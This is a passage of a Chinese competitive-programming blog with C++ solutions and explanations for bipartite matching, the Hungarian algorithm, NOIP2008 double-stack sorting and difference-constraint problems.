class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> F*This;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">DIS</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="keyword">return</span> min(<span class="built_in">abs</span>(x-y),n-<span class="built_in">abs</span>(x-y));&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Line</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++len].Point=y;</span><br><span class="line">    a[len].Next=Link[x];</span><br><span class="line">    Link[x]=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> x)</span><span class="comment">//匈牙利算法</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[x];i!=<span class="number">-1</span>;i=a[i].Next)</span><br><span class="line">    <span class="keyword">if</span>(!vis[a[i].Point])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> This=a[i].Point;</span><br><span class="line">        vis[This]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(!Get[This]||DFS(Get[This]))</span><br><span class="line">        &#123;</span><br><span class="line">            Get[This]=x;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(Link,<span class="number">-1</span>,<span class="keyword">sizeof</span>(Link));</span><br><span class="line">    n=In();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    d[i]=In();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> x=i+d[i];</span><br><span class="line">        <span class="keyword">int</span> y=i-d[i]+n;</span><br><span class="line">        x%=n; y%=n;</span><br><span class="line">        <span class="keyword">if</span>(DIS(x,i)!=d[i]) x=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(DIS(y,i)!=d[i]) y=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(x&lt;y) swap(x,y);<span class="comment">//将比较大的点放到优先访问的位置上面</span></span><br><span class="line">        <span class="keyword">if</span>(x!=<span class="number">-1</span>) Line(i,x);</span><br><span class="line">        <span class="keyword">if</span>(y!=<span class="number">-1</span>) Line(i,y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(vis,<span class="literal">false</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line">        <span class="keyword">if</span>(!DFS(i))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;No Answer&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) ans[Get[i]]=i;<span class="comment">//记录下来序列</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) <span class="built_in">cout</span>&lt;&lt;ans[i]&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="NOIP2008-双栈排序"><a href="#NOIP2008-双栈排序" class="headerlink" title="NOIP2008 双栈排序"></a>NOIP2008 双栈排序</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>Tom最近在研究一个有趣的排序问题。如图所示，通过2个栈S1和S2，Tom希望借助以下4种操作实现将输入序列升序排序。</p>
</blockquote>
<ol>
<li>操作a: 如果输入序列不为空，将第一个元素压入栈S1</li>
<li>操作b：如果栈S1不为空，将S1栈顶元素弹出至输出序列</li>
<li>操作c：如果输入序列不为空，将第一个元素压入栈S2</li>
<li>操作d：如果栈S2不为空，将S2栈顶元素弹出至输出序列</li>
<li>如果一个1~n的排列P可以通过一系列操作使得输出序列为1，2，…，(n-1)，n，Tom就称P是一个“可双栈排序排列”。例如(1,3,2,4)就是一个“可双栈排序序列”，而(2,3,4,1)不是。下图描述了一个将(1,3,2,4)排序的操作序列：&lt;a,c,c,b,a,d,d,b&gt;</li>
<li>当然，这样的操作序列有可能有几个，对于上例(1,3,2,4)，&lt;a,c,c,b,a,d,d,b&gt;是另外一个可行的操作序列。Tom希望知道其中字典序最小的操作序列是什么。</li>
</ol>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第一行是一个整数n。<br>第二行有n个用空格隔开的正整数，构成一个1~n的排列。</p>
</blockquote>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>共一行，如果输入的排列不是“可双栈排序排列”，输出数字0；否则输出字典序最小的操作序列，每两个操作之间用空格隔开，行尾没有空格。</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>这道题超级魔性，最后还是看了题解才弄懂，不过现在再看看这道题，其实就是因为一个公式没有想出来，然后就不知道该如何进行求解了。</p>
<p>这解这道题的时候，我们需要明白如何求解这个栈，因为这个栈是有两个的，那么我们就需要分清楚那些点是必须在一起的，不能在一起的。而如何求出来那一个点必须在哪一个栈里面呢，我们需要引入一个公式，也就是对于对于每一个 <code>i&lt;j&lt;k</code> 如果有 <code>a[k]&lt;a[i]&lt;a[j]</code> 那么这两个数 <code>a[i]</code> 和 <code>a[j]</code> 是不可以放到一个栈里面的。</p>
<p>这个公式的证明非常简单，用显然法即可。</p>
<p>那么我们就可以求出来那些点是可以在一起的，那些点不能在一起，然后我们就根据两个栈建立起来一个二分图，然后进行二分图匹配染色，这里的染色指的是判断那些点在一个集合里面。</p>
<p>最后我们在进行输出的时候就需要进行优先输出a和c，按照题意进行匹配就好，这里记住在if判断的时候一定要优先判断这个栈是否为空，然后在判断栈顶是否为This，如果这个栈空的，但是要求范围栈顶，那么就会出现错误的。</p>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,a[<span class="number">2000</span>],F[<span class="number">2000</span>];</span><br><span class="line"><span class="keyword">int</span> colour[<span class="number">2000</span>],This=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">bool</span> Edge[<span class="number">2000</span>][<span class="number">2000</span>];</span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; Sta1,Sta2;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    colour[x]=num;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">if</span>(Edge[x][i])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(colour[i]==num)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="number">0</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!colour[i])</span><br><span class="line">        DFS(i,<span class="number">3</span>-num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n; F[n]=<span class="number">123456789</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)</span><br><span class="line">    F[i]=min(F[i+<span class="number">1</span>],a[i+<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">    <span class="keyword">if</span>(a[i]&lt;a[j]&amp;&amp;F[j]&lt;a[i])</span><br><span class="line">    Edge[i][j]=<span class="literal">true</span>,Edge[j][i]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">if</span>(!colour[i]) DFS(i,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(colour[i]==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Sta1.push(a[i]);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;a &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Sta2.push(a[i]);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;c &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>((!Sta1.empty()&amp;&amp;Sta1.top()==This)||(!Sta2.empty()&amp;&amp;Sta2.top()==This))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!Sta1.empty()&amp;&amp;Sta1.top()==This)</span><br><span class="line">            &#123;</span><br><span class="line">                Sta1.pop();</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;b &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                Sta2.pop();</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;d &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            This++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>二分图匹配</tag>
      </tags>
  </entry>
  <entry>
    <title>二分图匹配</title>
    <url>/2017/05/22/78b866603d5e/</url>
    <content><![CDATA[<h1 id="二分图"><a href="#二分图" class="headerlink" title="二分图"></a>二分图</h1><blockquote>
<p>简单来说，如果图中点可以被分为两组，并且使得所有边都跨越组的边界，则这就是一个二分图。准确地说：把一个图的顶点划分为两个不相交集 U 和V ，使得每一条边都分别连接U、V中的顶点。如果存在这样的划分，则此图为一个二分图。二分图的一个等价定义是：不含有「含奇数条边的环」的图。</p>
</blockquote>
<h1 id="二分图的匹配"><a href="#二分图的匹配" class="headerlink" title="二分图的匹配"></a>二分图的匹配</h1><h2 id="最大匹配："><a href="#最大匹配：" class="headerlink" title="最大匹配："></a>最大匹配：</h2><blockquote>
<p>一个图所有匹配中，所含匹配边数最多的匹配，称为这个图的最大匹配。</p>
</blockquote>
<h2 id="完美匹配："><a href="#完美匹配：" class="headerlink" title="完美匹配："></a>完美匹配：</h2><blockquote>
<p>如果一个图的某个匹配中，所有的顶点都是匹配点，那么它就是一个完美匹配.显然，完美匹配一定是最大匹配（完美匹配的任何一个点都已经匹配，添加一条新的匹配边一定会与已有的匹配边冲突）。但并非每个图都存在完美匹配。</p>
</blockquote>
<h2 id="交替路："><a href="#交替路：" class="headerlink" title="交替路："></a>交替路：</h2><blockquote>
<p>从一个未匹配点出发，依次经过非匹配边、匹配边、非匹配边…形成的路径叫交替路。</p>
</blockquote>
<p><img src="https://xorex.space/image/040.png"></p>
<h2 id="增广路："><a href="#增广路：" class="headerlink" title="增广路："></a>增广路：</h2><blockquote>
<p>从一个未匹配点出发，走交替路，如果途径另一个未匹配点（出发的点不算），则这条交替路称为增广路（agumenting path）。</p>
</blockquote>
<p><img src="https://xorex.space/image/041.png"></p>
<h1 id="匈牙利算法"><a href="#匈牙利算法" class="headerlink" title="匈牙利算法"></a>匈牙利算法</h1><blockquote>
<p>匈牙利算法是由匈牙利数学家Edmonds于1965年提出，因而得名。匈牙利算法是基于Hall定理中充分性证明的思想，它是部图匹配最常见的算法，该算法的核心就是寻找增广路径，它是一种用增广路径求二分图最大匹配的算法。</p>
</blockquote>
<h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><p>以下内容转自与Dark_Scope的博客：<a href="http://blog.csdn.net/dark_scope/article/details/8880547">链接</a></p>
<p>通过数代人的努力，你终于赶上了剩男剩女的大潮，假设你是一位光荣的新世纪媒人，在你的手上有N个剩男，M个剩女，每个人都可能对多名异性有好感（:smile:暂时不考虑特殊的性取向），如果一对男女互有好感，那么你就可以把这一对撮合在一起，现在让我们无视掉所有的单相思（好忧伤的感觉快哭了），你拥有的大概就是下面这样一张关系图，每一条连线都表示互有好感。</p>
<p><img src="https://xorex.space/image/042.png"></p>
<p>本着救人一命，胜造七级浮屠的原则，你想要尽可能地撮合更多的情侣，匈牙利算法的工作模式会教你这样做：</p>
<h3 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h3><blockquote>
<p>先试着给1号男生找妹子，发现第一个和他相连的1号女生还名花无主，got it，连上一条蓝线</p>
</blockquote>
<p><img src="https://xorex.space/image/043.png"></p>
<h3 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h3><blockquote>
<p>接着给2号男生找妹子，发现第一个和他相连的2号女生名花无主，got it</p>
</blockquote>
<p><img src="https://xorex.space/image/044.png"></p>
<h3 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h3><blockquote>
<p>接下来是3号男生，很遗憾1号女生已经有主了，怎么办呢？<br><br>我们试着给之前1号女生匹配的男生（也就是1号男生）另外分配一个妹子。(黄色表示这条边被临时拆掉)</p>
</blockquote>
<p><img src="https://xorex.space/image/045.png"></p>
<blockquote>
<p>与1号男生相连的第二个女生是2号女生，但是2号女生也有主了，怎么办呢？我们再试着给2号女生的原配.重新找个妹子(注意这个步骤和上面是一样的，这是一个递归的过程)</p>
</blockquote>
<p><img src="https://xorex.space/image/046.png"></p>
<blockquote>
<p>此时发现2号男生还能找到3号女生，那么之前的问题迎刃而解了，回溯回去</p>
</blockquote>
<p>2号男生可以找3号妹子</p>
<p><img src="https://xorex.space/image/047.png"></p>
<p>1号男生可以找2号妹子了</p>
<p><img src="https://xorex.space/image/048.png"></p>
<p>3号男生可以找1号妹子</p>
<p><img src="https://xorex.space/image/049.png"></p>
<p>所以第三步最后的结果就是：</p>
<p><img src="https://xorex.space/image/050.png"></p>
<h3 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h3><blockquote>
<p>接下来是4号男生，很遗憾，按照第三步的节奏我们没法给4号男生腾出来一个妹子，我们实在是无能为力了……香吉士同学走好.</p>
</blockquote>
<p>这就是匈牙利算法的流程，其中找妹子是个递归的过程，最最关键的字就是“腾”字</p>
<p>其原则大概是：有机会上，没机会创造机会也要上</p>
<h2 id="代码模板："><a href="#代码模板：" class="headerlink" title="代码模板："></a>代码模板：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span> (j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">    &#123;    <span class="comment">//扫描每个妹子</span></span><br><span class="line">        <span class="keyword">if</span> (line[x][j]==<span class="literal">true</span> &amp;&amp; used[j]==<span class="literal">false</span>)</span><br><span class="line">        <span class="comment">//如果有暧昧并且还没有标记过(这里标记的意思是这次查找曾试图改变过该妹子的归属问题)</span></span><br><span class="line">        &#123;</span><br><span class="line">            used[j]=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (girl[j]==<span class="number">0</span> || find(girl[j]))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//名花无主或者能腾出个位置来，这里使用递归</span></span><br><span class="line">                girl[j]=x;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(used,<span class="number">0</span>,<span class="keyword">sizeof</span>(used));    <span class="comment">//这个在每一步中清空</span></span><br><span class="line">      if find(i) all+=1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在主程序我们这样做：每一步相当于我们上面描述的一二三四中的一步;</p>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>二分图匹配</tag>
      </tags>
  </entry>
  <entry>
    <title>LIST要学会的东西</title>
    <url>/2017/05/20/592c9ab8b67c/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><blockquote>
<p>靠着疯狂水第十页的大水题，然后成功挤进OJ排行榜的第一页，但是怕是马上杨树神就超过我了，不过一个月内再次进入应该还是没问题的，但是需要勤学知识点，勤敲代码啊。不想 <code>NOIP2017</code> 一结束就滚回去学文化课就需要努力的……</p>
</blockquote>
<p>所以说列出来了一些要学会的东西，能力才是最重要的，刷题量只是虚的，只能拿出来看看而已……加油吧！</p>
<h1 id="LIST"><a href="#LIST" class="headerlink" title="LIST"></a>LIST</h1><p>1.二分图匹配；</p>
<p>2.Hash表；</p>
<p>3.分块；</p>
<p>4.搜索；</p>
<h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>上面都是一些很虚的东西，OJ里面的例题并没有什么多少，重要的是这种能力，所以才会扒出来重点学，尤其是搜索，自己的搜索能力必须尽快提高，DFS要写的出神入化才行，分块要用线段树的例题写一写，然后Hash跟着刘神学，二分图跟着晗神学QAQ，东西不多，但是需要真的掌握！</p>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>规划</tag>
      </tags>
  </entry>
  <entry>
    <title>查分约束系统</title>
    <url>/2017/05/20/9f790d5caf99/</url>
    <content><![CDATA[<h1 id="查分约束："><a href="#查分约束：" class="headerlink" title="查分约束："></a>查分约束：</h1><blockquote>
<p>差分约束系统其实就是一种限制的关系，转换为一张图，然后跑一边SPFA，更新一遍，</p>
</blockquote>
<h1 id="P1984奖学金"><a href="#P1984奖学金" class="headerlink" title="P1984奖学金"></a>P1984奖学金</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>期末考试终于完了，老班决定召开班委会，内容嘛，则是可爱的奖学金的问题，她叫来了一些班委，每位班委提出了自己的意见：“我认为同学a的奖学金应该比b多！”老班决定要找出一种奖学金方案，满足各位班委的意见，且同时使得总奖学金数最少。每位同学奖学金最少为100元且都为整数。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><ol>
<li>第一行两个整数n,m，表示同学总数和班委意见数;</li>
<li>以下m行，每行2个整数a,b，表示某个班委认为第a号同学奖学金应该比第b号同学高</li>
</ol>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>若无法找到合法方案，则输出“impossible”(不含引号）；否则输出一个数表示最少总奖学金。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>我们将里面的a&gt;b转换为a=b+1，就可以建造一张这样的关系图了b到a存在着边权为1的路，然后我们就跑一遍SPFA美滋滋，更新出来所有符合要求的奖学金，如果不符合要求就直接退出输出impossible，如果符合就累加起来输出。</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">&#125;a[<span class="number">20000</span>];</span><br><span class="line"><span class="keyword">int</span> n,m,x,y,Link[<span class="number">20000</span>],len;</span><br><span class="line"><span class="keyword">int</span> dis[<span class="number">20000</span>],Queue[<span class="number">20000</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> head,tail,ans,Money[<span class="number">20000</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">In</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>,F=<span class="number">1</span>; <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;0&#x27;</span>||ch&gt;<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123; <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=-F; ch=getchar();&#125;</span><br><span class="line">    <span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123; This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;ch=getchar();&#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Topsort_SPFA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">if</span>(!dis[i]) Queue[++tail]=i;</span><br><span class="line">    <span class="keyword">while</span>(++head&lt;=tail)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[Queue[head]];i;i=a[i].Next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> This=a[i].Point; dis[This]--;</span><br><span class="line">        Money[This]=max(Money[This],Money[Queue[head]]+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(!dis[This]) Queue[++tail]=This;</span><br><span class="line">        <span class="keyword">if</span>(dis[This]&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(Money+<span class="number">1</span>,Money+n+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(Money[<span class="number">1</span>]&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=In(); m=In();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        y=In(); x=In();</span><br><span class="line">        a[++len].Point=y;</span><br><span class="line">        a[len].Next=Link[x];</span><br><span class="line">        Link[x]=len;</span><br><span class="line">        dis[y]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) Money[i]=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">if</span>(!Topsort_SPFA()||tail!=n) <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;impossible&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) ans+=Money[i];</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1985糖果"><a href="#P1985糖果" class="headerlink" title="P1985糖果"></a>P1985糖果</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>幼儿园里有N个小朋友，lxhgww老师现在想要给这些小朋友们分配糖果，要求每个小朋友都要分到糖果。但是小朋友们也有嫉妒心，总是会提出一些要求，比如小明不希望小红分到的糖果比他的多，于是在分配糖果的时候，lxhgww需要满足小朋友们的K个要求。幼儿园的糖果总是有限的，lxhgww想知道他至少需要准备多少个糖果，才能使得每个小朋友都能够分到糖果，并且满足小朋友们所有的要求。</p>
</blockquote>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第一行是两个整数N，K。接下来K行，表示这些点需要满足的关系，每行3个数字，X，A，B。</p>
</blockquote>
<ol>
<li>如果X=1， 表示第A个小朋友分到的糖果必须和第B个小朋友分到的糖果一样多；</li>
<li>如果X=2， 表示第A个小朋友分到的糖果必须少于第B个小朋友分到的糖果；</li>
<li>如果X=3， 表示第A个小朋友分到的糖果必须不少于第B个小朋友分到的糖果；</li>
<li>如果X=4， 表示第A个小朋友分到的糖果必须多于第B个小朋友分到的糖果；</li>
<li>如果X=5， 表示第A个小朋友分到的糖果必须不多于第B个小朋友分到的糖果；</li>
</ol>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出一行，表示lxhgww老师至少需要准备的糖果数，如果不能满足小朋友们的所有要求，就输出-1。</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>这道题好烦好烦，因为这道题不但麻烦的，而且第六组数据时需要进行逆向加边的，因为顺着地会超时，没错，十万个点的一条链，然后是就是理所应当的超时了，所以我们需要逆向加边……心累不说了，我要去搞树状数组了！QAQ</p>
